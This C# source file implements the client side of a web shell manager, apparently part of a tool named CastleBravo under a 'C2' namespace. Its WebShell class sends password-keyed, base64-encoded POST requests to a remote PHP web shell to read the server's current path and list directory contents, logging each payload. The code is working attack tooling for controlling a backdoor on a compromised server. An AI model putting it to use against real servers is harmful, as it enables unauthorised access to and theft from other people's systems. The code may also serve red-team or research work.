using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;
using System.Windows.Forms;

namespace C2.Business.CastleBravo.WebShellTool
{
    public class WebShell
    {
        private string url;
        private string pwd;
        private WebShellVersionSetting versionSetting;
        public List<string> PayloadLog;

        private WebClient client;

        public WebShell(string address, string pVariable, WebShellVersionSetting versionSetting)
        {
            this.url = address;
            this.pwd = pVariable;
            this.versionSetting = versionSetting;
            PayloadLog = new List<string>();

            this.client = new WebClient();
            client.Encoding = Encoding.UTF8;
        }

        public Tuple<string, List<WSFile>> CurrentPathBrowse()
        {
            return PathBrowse(PHPIndex());
        }

        public Tuple<string, List<WSFile>> PathBrowse(string path)
        {
            List<WSFile> pathFiles = new List<WSFile>();

            if (string.IsNullOrEmpty(path))
                return Tuple.Create(path, pathFiles);


            string readDict = PHPReadDict(path);
            foreach (string item in readDict.Split('\n'))
            {
                string[] itemInfo = item.Split('\t');
                if (itemInfo.Length != 4 || itemInfo[0] == "./" || itemInfo[0] == "../" || string.IsNullOrEmpty(itemInfo[0]))
                    continue;

                pathFiles.Add(new WSFile(itemInfo[0].EndsWith("/") ? WebShellFileType.Directory : WebShellFileType.File,
                                         itemInfo[0].EndsWith("/") ? itemInfo[0].Substring(0, itemInfo[0].Length - 1) : itemInfo[0],
                                         itemInfo[1],
                                         itemInfo[2],
                                         itemInfo[3]));
            }
            return Tuple.Create(path, pathFiles);
        }

        private string PHPIndex()
        {
            PayloadLog.Add("========获取当前路径========");
            return PHPPost(pwd + "=" + versionSetting.PHP_MAKE + "&" + versionSetting.ACTION + "=" + versionSetting.PHP_INDEX).Split('\t')[0];
        }

        private string PHPReadDict(string path)
        {
            PayloadLog.Add("========获取" + path + "文件========");
            return PHPPost(pwd + "=" + versionSetting.PHP_MAKE + "&" + versionSetting.ACTION + "=" + versionSetting.PHP_READDICT + "&" + versionSetting.PARAM1 + "=" + HttpUtility.UrlEncode(Convert.ToBase64String(Encoding.UTF8.GetBytes(path))));
        }

        private string PHPPost(string payload)
        {
            client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");

            byte[] postData = Encoding.UTF8.GetBytes(payload);
            string result = string.Empty;

            try
            {
                byte[] responseData = client.UploadData(url, "POST", postData);//得到返回字符流  
                result = Encoding.UTF8.GetString(responseData);//解码 

                foreach (string kv in payload.Split('&'))
                {
                    PayloadLog.Add(kv);
                }
            }
            catch (Exception ex)
            {
                PayloadLog.Add(ex.Message);
            }

            return MidStrEx(result, versionSetting.SPL, versionSetting.SPR);
        }

        private string MidStrEx(string sourse, string startstr, string endstr)
        {
            string result = string.Empty;
            int startindex, endindex;
            try
            {
                startindex = sourse.IndexOf(startstr);
                if (startindex == -1)
                    return result;
                string tmpstr = sourse.Substring(startindex + startstr.Length);
                endindex = tmpstr.IndexOf(endstr);
                if (endindex == -1)
                    return result;
                result = tmpstr.Remove(endindex);
            }
            catch { }
            return result;
        }
    }

    public enum WebShellFileType
    {
        Null,
        Directory,
        File
    }

    public class WSFile
    {
        public WebShellFileType Type { get; set; }
        public string FileName { get; set; }
        public string CreateTime { get; set; }
        public string FileSize { get; set; }
        public string LastMod { get; set; }

        public WSFile(WebShellFileType type, string fileName, string createTime, string fileSize, string lastMod)
        {
            Type = type;
            FileName = fileName;
            CreateTime = createTime;
            FileSize = fileSize;
            LastMod = lastMod;
        }
    }
}

